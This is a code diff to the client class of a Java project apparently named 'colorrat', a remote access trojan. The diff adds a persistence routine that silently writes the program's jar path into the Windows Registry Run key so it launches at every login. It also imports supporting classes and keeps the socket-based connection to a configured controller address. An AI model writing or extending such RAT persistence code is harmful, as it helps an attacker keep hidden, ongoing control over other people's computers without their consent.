@@ -3,10 +3,15 @@ package eu.aragonapp.colorrat;
 import eu.aragonapp.colorrat.network.packet.Packet;
 import eu.aragonapp.colorrat.network.thread.types.ConnectThread;
 import eu.aragonapp.colorrat.network.thread.types.ReceiveThread;
+import eu.aragonapp.colorrat.utils.WinRegistry;
 
+import javax.swing.*;
+import java.io.File;
 import java.io.ObjectInputStream;
 import java.io.ObjectOutputStream;
+import java.lang.reflect.InvocationTargetException;
 import java.net.Socket;
+import java.util.prefs.Preferences;
 
 /**
  * @Copyright (c) 2018 Mythic Inc. (http://www.mythic.com/) All Rights Reserved.
@@ -27,14 +32,25 @@ public class ColorClient {
     private ConnectThread connectThread;
     private ReceiveThread receiveThread;
 
+    private final File jarFile;
+
     private boolean connected;
     private Socket socket;
 
+    private boolean startup;
     private String address;
     private int port;
 
     public ColorClient() {
+        this.jarFile = new File(ColorClient.class.getProtectionDomain().getCodeSource().getLocation().getPath());
         setInformations();
+
+        if (this.startup) {
+            try {
+                WinRegistry.writeStringValue("Software\\Microsoft\\Windows\\CurrentVersion\\Run", this.jarFile.getName().replace(".jar", ""), "\"" + System.getProperty("java.home") + " -jar " + this.jarFile.getAbsolutePath() + "\"");
+            } catch (Exception ex) { }
+        }
+
         instance = this;
 
         this.connectThread = new ConnectThread();
@@ -118,7 +134,7 @@ public class ColorClient {
     public String getAddress() {
         return this.address;
     }
-    
+
     public boolean isConnected() {
         return connected;
     }
